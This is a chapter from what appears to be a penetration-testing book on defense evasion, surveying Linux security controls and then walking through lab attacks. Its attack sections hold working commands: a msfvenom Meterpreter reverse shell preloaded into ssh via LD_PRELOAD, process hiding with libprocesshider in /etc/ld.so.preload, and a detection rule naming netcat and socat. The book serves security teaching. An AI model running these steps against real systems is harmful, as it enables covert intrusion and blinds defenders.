<html><head></head><body>
<section epub:type="chapter" role="doc-chapter" aria-labelledby="ch12">&#13;
<hgroup>&#13;
<h1 class="CHAPTER" id="ch12">&#13;
<span class="CN"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_281" aria-label="281"/><span class="SANS_Futura_Std_Bold_Condensed_B_11">12</span></span>&#13;
<span class="CT"><span class="SANS_Dogma_OT_Bold_B_11">DEFENSE EVASION AND EXFILTRATION</span></span>&#13;
</h1>&#13;
</hgroup>&#13;
<figure class="opener"><img class="opener" src="../images/opener.jpg" alt=""/></figure>&#13;
<p class="COS">The actions you take against your target will inevitably leave traces. In this chapter, you’ll learn about the defense mechanisms commonly seen in production environments, as well as methods you can use to extract data from systems without detection. You’ll explore ways of concealing malicious processes and commands, disabling security tools, encrypting and encoding data, and exfiltrating sensitive information.</p>&#13;
<section epub:type="division" aria-labelledby="sec1">&#13;
<h2 class="H1" id="sec1"><span id="h1-99"/><span class="SANS_Futura_Std_Bold_B_11">Defensive Controls</span></h2>&#13;
<p class="TNI1">You could come across many types of security controls during a penetration test. Most defensive tools deployed on endpoints are hard to detect when you’re attacking a host from a black box perspective, and you won’t know they exist until you’ve compromised the host. Exceptions to this exist, <span role="doc-pagebreak" epub:type="pagebreak" id="pg_282" aria-label="282"/>however. For example, if an agent takes actions when attacked, such as blocking the attacker, you may be able to tell that the host is self-protecting.</p>&#13;
<p class="TX">The defensive security space is vast, so covering every possible tool you could encounter would likely require a book of its own. However, the following sections discuss key control types in more detail.</p>&#13;
<section epub:type="division" aria-labelledby="sec2">&#13;
<h3 class="H2" id="sec2"><span id="h2-169"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Endpoint Security</span></h3>&#13;
<p class="TNI1">Endpoint security technologies aim to provide telemetry to defenders, identify anomalous activity on servers, and (ideally) prevent attackers from succeeding. Production environments may use tools like the following:</p>&#13;
<p class="ListHead"><b>Extended detection and response</b></p>&#13;
<p class="ListPlainFirst">Also called endpoint detection and response (EDR) when focused only on endpoints, <i>extended</i> detection and response (XDR) solutions attempt to collect data from anything that can emit log events, such as servers, firewalls, cloud services, and inbound and outbound email. XDR solutions correlate the collected data to give defenders an understanding of interesting events happening on the network and stitch together a story about malicious operations moving laterally. On servers, EDR and XDR solutions typically implement software agents that collect information and prevent malicious software from running based on various types of heuristics. They also provide defenders with the ability to send commands to the monitored hosts and respond to incidents.</p>&#13;
<p class="ListHead"><b>Data loss prevention</b></p>&#13;
<p class="ListPlainFirst">Data loss prevention (DLP) systems classify data at rest and in transit, then take measures to prevent data exfiltration based on policies predefined by the system’s owner. DLP systems can work at the host and network levels, such as by monitoring traffic going out of a system or by monitoring emails sent from an organization. Their goal is to ensure that sensitive data doesn’t leave an organization’s boundaries unless authorized.</p>&#13;
<p class="ListHead"><b>Traditional antivirus systems</b></p>&#13;
<p class="ListPlainFirst">Often used for compliance reasons, traditional antivirus solutions are still alive and kicking. These tools, such as ClamAV for Linux, scan filesystems for known malicious file hashes and quarantine files that have matching hashes. They rely on the existence of up-to-date hash databases to identify modern threats. Today, most signature-based antivirus scanning exists as modules in EDR and XDR solutions.</p>&#13;
<p class="ListHead"><b>File integrity monitoring</b></p>&#13;
<p class="ListPlainFirst">File integrity monitoring (FIM) systems monitor sensitive filesystem paths for changes such as file writes or deletes, then prevent unauthorized modifications. For example, in <span class="listplain_Xref"><a href="chapter8.xhtml">Chapter 8</a></span>, you learned that the <i>/etc</i> directory hosts configuration files, which shouldn’t be changed regularly after a system is deployed. A FIM could detect modifications to files such as <i>/etc/passwd</i> and <i>/etc/shadow</i>, which could indicate that an attacker is attempting to backdoor a system. Open source–based FIM <span role="doc-pagebreak" epub:type="pagebreak" id="pg_283" aria-label="283"/>solutions include Open Source Tripwire, Advanced Intrusion Detection Environment (AIDE), and OSSEC.</p>&#13;
<p class="ListHead"><b>Extended Berkeley Packet Filter</b></p>&#13;
<p class="ListPlainFirst">The Extended Berkeley Packet Filter (eBPF) kernel instrumentation software allows programmers to safely write sandboxed code in the kernel. The Linux kernel provides a logical place to implement tasks such as security monitoring, tracing, and logging, but prior to eBPF, doing all this came with stability risks. In a security context, eBPF can identify and mitigate malicious activity, hook into various system mechanisms, and provide defenders with greater visibility into the system.</p>&#13;
<p class="ListHead"><b>Security-Enhanced Linux and AppArmor</b></p>&#13;
<p class="ListPlainFirst">Security-Enhanced Linux (SELinux) is a security mechanism used to enforce mandatory access control on Linux systems. Originally developed by the US National Security Agency, SELinux policies can restrict who and what can access files, processes, and applications on protected systems. AppArmor is a Linux security module that protects applications from taking potentially harmful actions by applying security profiles to them. These security profiles can dictate the application’s allowed actions, its capabilities, and any actions AppArmor needs to take when an application violates the policy.</p>&#13;
<p class="ListHead"><b>Host-based firewalls</b></p>&#13;
<p class="ListPlainFirst">Companies often rely on only one network firewall at the perimeter, allowing all endpoints inside the network to communicate freely with one another. Host-based firewalls can help an organization make lateral movement harder and isolate potentially compromised machines. As their name suggests, these firewalls run locally, filtering unauthorized traffic coming into or out of the host by using predefined rule tables. Linux offers various firewalls, such as iptables, firewalld, nftables, and Uncomplicated Firewall (UFW).</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec3">&#13;
<h3 class="H2" id="sec3"><span id="h2-170"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Application and API Security</span></h3>&#13;
<p class="TNI1">Modern applications and APIs require protection from a variety of attacks, such as data extraction and denial of service. As such, companies tend to rely on third-party applications to provide umbrella protection for their apps:</p>&#13;
<p class="ListHead"><b>Web application firewalls</b></p>&#13;
<p class="ListPlainFirst">Web application firewalls (WAFs) are software- or hardware-based firewalls operating at Layer 7 of the OSI model (the application layer). Today, they’re often powerful cloud-based services that inspect requests and responses coming into an application. WAFs implement signature- and behavior-based heuristics to identify malicious traffic; they also use threat intelligence data to identify bad actors, often based on source IP addresses or browser fingerprints.</p>&#13;
<p class="ListHead"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_284" aria-label="284"/><b>Web application and API security</b></p>&#13;
<p class="ListPlainFirst">An extension to traditional web application firewalls, web application and API security (WAAS) solutions address vulnerabilities within an organization’s ecosystem by inspecting its internal traffic, such as communications between microservices. WAAS solutions are often deployed on servers and consider the application and runtime environment.</p>&#13;
<p class="ListHead"><b>Runtime application self-protection</b></p>&#13;
<p class="ListPlainFirst">Application firewalls don’t necessarily understand anything about the applications they’re protecting. Runtime application self-protection (RASP) solutions attempt to address this by keeping track of what applications are doing when they handle requests. For example, if a SQL injection attack manages to bypass the web application firewall sitting on the perimeter, the attacked application may send the SQL command to its database and return a response containing a large amount of personal data. Because they have insight into the code, RASP solutions may identify these attempts and block them.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec4">&#13;
<h3 class="H2" id="sec4"><span id="h2-171"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Network Security</span></h3>&#13;
<p class="TNI1">Companies often overlook network security, as they frequently protect against malicious traffic coming from the outside internet but neglect to do the same for internal traffic. The following solutions can address these gaps:</p>&#13;
<p class="ListHead"><b>Intrusion detection and prevention systems</b></p>&#13;
<p class="ListPlainFirst">Intrusion detection and prevention systems (IDS/IPS) are software or hardware appliances that observe the network for signs of intrusion based on traffic patterns. These systems tend to use known-bad signatures along with other heuristics, and once they observe a malicious payload on the wire, they alert or block the traffic altogether. Some examples of IDS and IPS systems are Snort, Zeek, Suricata, and OSSEC.</p>&#13;
<p class="ListHead"><b>Network firewalls</b></p>&#13;
<p class="ListPlainFirst">Network firewalls inspect incoming and outgoing traffic at critical points in a network architecture, filtering traffic originating from the internet and between internal networks. We often call modern firewalls <i>next-generation firewalls</i> because of all their additional capabilities, such as URL filtering, deep packet inspection, malware detection, built-in threat intelligence, and protocol or application identification.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec5">&#13;
<h3 class="H2" id="sec5"><span id="h2-172"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Honeypots</span></h3>&#13;
<p class="TNI1">Honeypots are designed to look like real production systems, but their true purpose is to detect threat actors attempting to breach a network or move laterally after a successful breach. Honeypots can also collect threat intelligence. By luring attackers into targeting particular systems, defenders can learn about their current tactics and techniques. This information can help strengthen security controls and focus on possible areas of weakness.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec6">&#13;
<h3 class="H2" id="sec6"><span id="h2-173"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_285" aria-label="285"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Log Collection and Aggregation</span></h3>&#13;
<p class="TNI1">Logs are a critical asset for defenders, as they provide evidence of breaches both during an incident and after the fact. A system can collect logs from almost anything, including hosts, printers, network switches, firewalls, and applications. Endpoints often transmit logs to centralized security information and event management systems, where defenders can correlate events to identify anomalies. Examples of mechanisms that collect logs for security purposes include Auditd, Fluent Bit, and syslog clients. Logs from these components are often centralized in applications such as OSSEC and Wazuh.</p>&#13;
<p class="TX"><a href="chapter12.xhtml#tab12-1">Table 12-1</a> lists several host-level controls and their unique characteristics, such as their process names and where they store their runtime files.</p>&#13;
<p class="TT" id="tab12-1"><span class="Heavy"><span class="SANS_Futura_Std_Heavy_B_11">Table 12-1:</span></span> <span class="SANS_Futura_Std_Book_11">Security Controls and Their Identifiers</span></p>&#13;
<table class="Basic-Table">&#13;
<thead>&#13;
<tr>&#13;
<th class="TCH" scope="col"><p class="TCH1"><span class="SANS_Futura_Std_Heavy_B_11">Name</span></p></th>&#13;
<th class="TCH" scope="col"><p class="TCH1"><span class="SANS_Futura_Std_Heavy_B_11">Category</span></p></th>&#13;
<th class="TCH" scope="col"><p class="TCH1"><span class="SANS_Futura_Std_Heavy_B_11">Identifier type</span></p></th>&#13;
<th class="TCH" scope="col"><p class="TCH1"><span class="SANS_Futura_Std_Heavy_B_11">Identifier</span></p></th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td class="TBF"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Auditd</span></p></td>&#13;
<td class="TBF"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Security audit logging</span></p></td>&#13;
<td class="TBF"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Process name</span></p></td>&#13;
<td class="TBF"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">auditd</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">OSSEC</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Intrusion detection</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Process name</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">ossec</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">syslog</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Event data log protocol</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Process name</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">syslog<br/>rsyslog<br/>syslog-ng</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">iptables</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Host-based firewall</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Process name</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">iptables</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">UFW</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Host-based firewall</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Process name</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_TheSansMonoCd_W5Regular_11">ufw</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Open Source Tripwire</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">File integrity monitoring</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Directory</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_Oblique_I_11">/etc/tripwire</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">AIDE</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">File integrity monitoring</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Directory</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_Oblique_I_11">/etc/aide</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">AppArmor</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Application security profiling</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Directory</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_Oblique_I_11">/etc/apparmor.d</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">chkrootkit</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Rootkit scanner</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Directory</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_Oblique_I_11">/etc/chkrootkit</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">SELinux</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Mandatory access control enforcement</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Directory</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_Oblique_I_11">/etc/selinux</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Fluent Bit</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Log collection</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Directory</span></p></td>&#13;
<td class="TB"><p class="TB1"><span class="SANS_Futura_Std_Book_Oblique_I_11">/etc/fluent-bit</span></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TBL"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Rootkit Hunter</span></p></td>&#13;
<td class="TBL"><p class="TB1"><span class="SANS_Futura_Std_Book_11">Rootkit scanner</span></p></td>&#13;
<td class="TBL"><p class="TB1"><span class="SANS_Futura_Std_Book_11">File</span></p></td>&#13;
<td class="TBL"><p class="TB1"><span class="SANS_Futura_Std_Book_Oblique_I_11">/etc/rkhunter.conf</span></p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="TX">This table primarily focuses on open source endpoint security controls. We’ll use it in Exercise 26.</p>&#13;
<p class="HeadAExercise"><span id="exe-26"/><span class="SANS_Futura_Std_Heavy_B_15">Exercise 26: Auditing Hosts for Landmines</span></p>&#13;
<p class="TNI1">Imagine that you need to write a script to download malicious code from the internet and onto a compromised machine. Before the script executes the download, it should understand the compromised host’s runtime environment and halt its operation if any security tools are found.</p>&#13;
<p class="TX">In this exercise, you’ll implement such a script. <a href="chapter12.xhtml#tab12-1">Table 12-1</a> provided predefined heuristics you can use to identify security tools. For example, when installed, Tripwire creates a directory under <i>/etc/tripwire</i>, while syslog servers <span role="doc-pagebreak" epub:type="pagebreak" id="pg_286" aria-label="286"/>generally run using specific process names, such as <i>rsyslog</i> or <i>syslog-ng</i>. At a high level, your script should be able to do the following:</p>&#13;
<p class="NLF">  1.  Check the environment for defensive security tools.</p>&#13;
<p class="NL">  2.  Download the malware if the host is found to be unprotected. You can use an EICAR file such as the one at <i><a href="https://secure.eicar.org/eicar.com.txt">https://secure.eicar.org/eicar.com.txt</a></i> to simulate the download of a malicious file. <i>EICAR files</i> trigger security detection tools safely, without involving real malicious files that could be harmful.</p>&#13;
<p class="NLL">  3.  If the host is protected, generate a report listing the identified tools.</p>&#13;
<p class="TX">You can find an example solution, <i>exercise_solution.sh</i>, in the book’s GitHub repository. To take this exercise further, conduct additional research into Linux-based security tools and grow your table of heuristics. You can also go beyond just detecting tools based on their process names, files, and directories. For example, try checking loaded kernel modules (using <span class="SANS_TheSansMonoCd_W5Regular_11">lsmod</span>) or installed packages (using <span class="SANS_TheSansMonoCd_W5Regular_11">dpkg</span>).</p>&#13;
<blockquote>&#13;
<p class="Note"><span class="SANS_Dogma_OT_Bold_B_15">NOTE</span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>Download this chapter’s scripts from</i> <span class="note_LinkURL_I"><a href="https://github.com/dolevf/Black-Hat-Bash/blob/master/ch12">https://github.com/dolevf/Black-Hat-Bash/blob/master/ch12</a></span>.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec7">&#13;
<h2 class="H1" id="sec7"><span id="h1-100"/><span class="SANS_Futura_Std_Bold_B_11">Concealing Malicious Processes</span></h2>&#13;
<p class="TNI1">Defensive tools frequently identify malicious activity based on the presence of anomalous processes running on a system. In this section, we’ll consider three techniques for keeping a malicious process out of sight: preloading malicious shared libraries into a benign process, hiding the process’s execution, and changing the process name to masquerade as legitimate.</p>&#13;
<section epub:type="division" aria-labelledby="sec8">&#13;
<h3 class="H2" id="sec8"><span id="h2-174"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Library Preloading</span></h3>&#13;
<p class="TNI1">Let’s use <span class="SANS_TheSansMonoCd_W5Regular_11">LD_PRELOAD</span> to preload a malicious shared library. This environment variable accepts a list of user-specified shared objects to load before all others. We’ll set up a listener on Kali and perform the shared library preloading on a process on <i>p-jumpbox-01</i> (172.16.10.13).</p>&#13;
<p class="TX">As our malicious code, we’ll use Metasploit’s <i>Meterpreter</i> payload, a part of the Metasploit framework, which can provide attackers with an interactive shell. On Kali, run the following command to generate a Meterpreter shared object:</p>&#13;
<pre><code>$ <b>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.16.10.1 LPORT=2222 -f</b>&#13;
<b>elf-so &gt; meterpreter.so</b>&#13;
</code></pre>&#13;
<p class="TX">This command uses the <span class="SANS_TheSansMonoCd_W5Regular_11">reverse_tcp</span> payload, which will bind on the local host address of 172.16.10.1 (Kali’s address), on local port 2222/TCP, using the <span class="SANS_TheSansMonoCd_W5Regular_11">elf-so</span> format. Then it will redirect output into <i>meterpreter.so</i>. Run the <span class="SANS_TheSansMonoCd_W7Bold_B_11">file</span> command to see the format of this file:</p>&#13;
<pre><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_287" aria-label="287"/>$ <b>file meterpreter.so</b>&#13;
&#13;
meterpreter.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV),&#13;
dynamically linked, stripped&#13;
</code></pre>&#13;
<p class="TX">You can then upload this file to the <i>p-jumpbox-01</i> machine with <span class="SANS_TheSansMonoCd_W5Regular_11">scp</span>:</p>&#13;
<pre><code>$ <b>scp -O meterpreter.so backup@172.16.10.13:/tmp</b></code></pre>&#13;
<p class="TX">This command uses the <span class="Italic">backup</span> user. Remember that their password is <i>backup</i>.</p>&#13;
<blockquote>&#13;
<p class="Note"><span class="SANS_Dogma_OT_Bold_B_15">NOTE</span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>Be aware that any endpoint security protection controls running on the system may notify security analysts of the existence of a Meterpreter payload. In general, writing your own payload is often a more effective way of ensuring that an operation will go undetected.</i></p>&#13;
<p class="TX">Next, on Kali, run <span class="SANS_TheSansMonoCd_W7Bold_B_11">msfconsole</span> to start Metasploit, then set up the TCP listener:</p>&#13;
<pre><code>msf &gt; <b>use exploit/multi/handler</b>&#13;
msf &gt; <b>set payload linux/x64/meterpreter/reverse_tcp</b>&#13;
msf &gt; <b>set LHOST 172.16.10.1</b>&#13;
msf &gt; <b>set LPORT 2222</b>&#13;
msf &gt; <b>run</b>&#13;
</code></pre>&#13;
<p class="TX">This listener will establish a Meterpreter session after we preload the Meterpreter shared object.</p>&#13;
<p class="TX">We want to load the Meterpreter payload into an innocent-looking process. Let’s see what processes are currently running on <i>p-jumpbox-01</i> (172.16.10.13):</p>&#13;
<pre><code>$ <b>ps aux</b>&#13;
&#13;
USER    PID %CPU %MEM   STAT START   TIME COMMAND&#13;
root      1  0.0  0.0   Ss   Nov23   0:00 /bin/sh -c service ssh restart &amp;&amp; tail -f /dev/null&#13;
<b>root     17  0.0  0.0   Ss   Nov23   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups</b>&#13;
root     28  0.0  0.0   S    Nov23   0:38 tail -f /dev/null&#13;
root  30238  0.0  0.0   Ss   Nov28   0:00 bash&#13;
root  37405  100  0.0   R+   03:14   0:00 ps aux&#13;
</code></pre>&#13;
<p class="TX">If your malicious operation will establish a network connection, it’s recommended to use a process that blue teamers expect to see performing network activity, such as an SSH server or a web server. In this case, we’ll use <span class="SANS_TheSansMonoCd_W5Regular_11">sshd</span> with the command in <a href="chapter12.xhtml#Lis12-1">Listing 12-1</a>.</p>&#13;
<span id="Lis12-1"/><pre><code>$ <b>LD_PRELOAD=/tmp/meterpreter.so ssh</b></code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-1: Using LD_PRELOAD to preload Meterpreter</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_288" aria-label="288"/>In Metasploit, you should see output similar to the following:</p>&#13;
<pre><code>[*] Started reverse TCP handler on 172.16.10.1:2222&#13;
[*] Sending stage (3045348 bytes) to 172.16.10.13&#13;
[*] Meterpreter session 1 opened (172.16.10.1:2222 -&gt; 172.16.10.13:46048)&#13;
&#13;
meterpreter &gt;&#13;
</code></pre>&#13;
<p class="TX">Now that you have a Meterpreter shell, run the <span class="SANS_TheSansMonoCd_W7Bold_B_11">help</span> command to see the commands available to you.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec9">&#13;
<h3 class="H2" id="sec9"><span id="h2-175"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Process Hiding</span></h3>&#13;
<p class="TNI1">Another way to hide malicious processes is with <i>libprocesshider</i>, developed by Gianluca Borello. This tool also uses preloading to load custom shared libraries before other libraries are loaded. We’ll use libprocesshider to hide the process name from tools such as <span class="SANS_TheSansMonoCd_W5Regular_11">ps</span>.</p>&#13;
<p class="TX">On Kali, run the following commands to clone the GitHub repository:</p>&#13;
<pre><code>$ <b>git clone https://github.com/gianlucaborello/libprocesshider</b>&#13;
$ <b>cd libprocesshider</b>&#13;
</code></pre>&#13;
<p class="TX">Next, modify the <i>processhider.c</i> script to use the process name you want to hide (instead of the script’s default value of <i>evil_script.py</i>). In this case, we’ll replace it with <i>sshd</i>:</p>&#13;
<pre><code>$ <b>sed -i s'/evil_script.py/cron/'g processhider.c</b></code></pre>&#13;
<p class="TX">Next, compile the script by using <span class="SANS_TheSansMonoCd_W7Bold_B_11">make</span>:</p>&#13;
<pre><code>$ <b>make</b></code></pre>&#13;
<p class="TX">This command should create a file named <i>libprocesshider.so</i>. Copy it to the <i>p-jumpbox-01</i> machine (172.16.10.13). Next, add the <i>libprocesshider.so</i> filepath to the <i>/etc/ld.so.preload</i> file on <i>p-jumpbox-01</i> using the <i>root</i> user. The changes should take effect immediately after you add this line:</p>&#13;
<pre><code># <b>echo /tmp/libprocesshider.so &gt;&gt; /etc/ld.so.preload</b></code></pre>&#13;
<p class="TX">Run <span class="SANS_TheSansMonoCd_W7Bold_B_11">ps</span> again to see the result:</p>&#13;
<pre><code># <b>ps aux</b>&#13;
&#13;
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND&#13;
root           1  0.0  0.0   2752   972 ?        Ss   03:23   0:00 /bin/sh -c service ssh re...&#13;
root          29  0.0  0.0   3760  2132 ?        Ss   03:23   0:00 /usr/sbin/cron -P&#13;
root          30  0.0  0.0   2684   904 ?        S    03:23   0:00 tail -f /dev/null&#13;
root          34  0.0  0.0   4524  3892 pts/0    Ss+  03:23   0:00 bash&#13;
backup        68  0.0  0.0   4524  3836 pts/1    Ss   03:26   0:00 -bash&#13;
backup       113  0.0  0.0   4524  3748 pts/2    Ss   03:38   0:00 -bash&#13;
backup       116  100  0.1   8224  4064 pts/2    R+   03:38   0:00 ps aux&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_289" aria-label="289"/>As you can see, the <span class="SANS_TheSansMonoCd_W5Regular_11">sshd</span> process is hidden from the output. It should also be hidden from other tools, such as <span class="SANS_TheSansMonoCd_W5Regular_11">top</span>:</p>&#13;
<pre><code># <b>top -n 1</b>&#13;
&#13;
Tasks:   6 total,   1 running,   5 sleeping,   0 stopped,   0 zombie&#13;
%Cpu(s):100.0 us,  0.0 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st&#13;
MiB Mem :   3920.9 total,   1333.0 free,   1350.8 used,   1598.0 buff/cache&#13;
MiB Swap:   1024.0 total,    681.3 free,    342.7 used.   2570.2 avail Mem&#13;
&#13;
    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND&#13;
      1 root      20   0    2752    972    868 S   0.0   0.0   0:00.02 sh&#13;
     29 root      20   0    3760   2316   2080 S   0.0   0.1   0:00.00 cron&#13;
     30 root      20   0    2684    904    800 S   0.0   0.0   0:00.12 tail&#13;
     34 root      20   0    4524   3972   3296 S   0.0   0.1   0:00.19 bash&#13;
     68 backup    20   0    4524   3836   3224 S   0.0   0.1   0:00.01 bash&#13;
    153 root      20   0    8728   4728   2828 R   0.0   0.1   0:00.01 top&#13;
</code></pre>&#13;
<p class="TX">However, this method isn’t foolproof, as the malicious process hasn’t disappeared completely. You can still find it under the <i>/proc</i> filesystem by specifying the PID in the filepath:</p>&#13;
<pre><code># <b>cat /proc/17/comm</b>&#13;
&#13;
sshd&#13;
</code></pre>&#13;
<p class="TX">To further conceal your processes, you could try masquerading them.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec10">&#13;
<h3 class="H2" id="sec10"><span id="h2-176"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Process Masquerading</span></h3>&#13;
<p class="TNI1"><i>Process masquerading</i> is a general term for techniques that adversaries use to mask a malicious process as legitimate. For instance, they may rename it to something that looks like a system process by using hard-to-spot typos, like <i>corn</i>, which may look like <i>cron</i> at first glance. Such renaming could evade endpoint security tools that use custom detection rules to look for the names of specific executing binaries. For example, consider the following pseudocode for an alert:</p>&#13;
<pre><code>alert if os_type == "Linux" AND process_name in("ping", "nping", "hping",&#13;
"hping2", "hping3", "nc", "ncat", "netcat", "socat")&#13;
</code></pre>&#13;
<p class="TX">This alert logic seeks to catch processes with names such as <span class="SANS_TheSansMonoCd_W5Regular_11">ping</span>, <span class="SANS_TheSansMonoCd_W5Regular_11">netcat</span>, and <span class="SANS_TheSansMonoCd_W5Regular_11">socat</span> on any Linux operating system.</p>&#13;
<p class="TX">The problem with binary name–based detection rules is that binary names can be changed, so they’re easier to evade than behavior-based detections or more intelligent heuristics. In the next exercise, you’ll hide a process by using evasive names.</p>&#13;
<p class="HeadAExercise"><span id="exe-27"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_290" aria-label="290"/><span class="SANS_Futura_Std_Heavy_B_15">Exercise 27: Rotating Process Names</span></p>&#13;
<p class="TNI1">In this exercise, you’ll run a process by using a random name so it blends in with the environment and becomes harder to spot. We’ll use a handful of possible process names surrounded by square brackets (<span class="SANS_TheSansMonoCd_W5Regular_11">[]</span>), which usually indicate that the processes don’t have an associated command line like those in <i>/proc/PID/cmdline</i>. Kernel threads are an example of such processes.</p>&#13;
<p class="TX"><a href="chapter12.xhtml#Lis12-2">Listing 12-2</a> shows examples of process names with square brackets running on Kali. Use <span class="SANS_TheSansMonoCd_W5Regular_11">grep</span> with a regular expression to extract this text.</p>&#13;
<span id="Lis12-2"/><pre><code>$ <b>ps aux | grep -o '\[.*]' | head -8</b>&#13;
&#13;
[kthreadd]&#13;
[rcu_gp]&#13;
[rcu_par_gp]&#13;
[slub_flushwq]&#13;
[netns]&#13;
[mm_percpu_wq]&#13;
[rcu_tasks_kthread]&#13;
[rcu_tasks_rude_kthread]&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I">Listing 12-2: Listing processes with square brackets</span></p>&#13;
<p class="TX">By using square brackets, you can make your process look more legitimate and harder to catch, because defenders might assume it to be a normal system process and skip it when reviewing process lists.</p>&#13;
<p class="TX">To get started, consider the script in <a href="chapter12.xhtml#Lis12-3">Listing 12-3</a>. We’ll unpack it together.</p>&#13;
<span id="Lis12-3"/>&#13;
<p class="CodeLabel"><span class="codelabel_Italic">binary_name _rotation.sh</span></p>&#13;
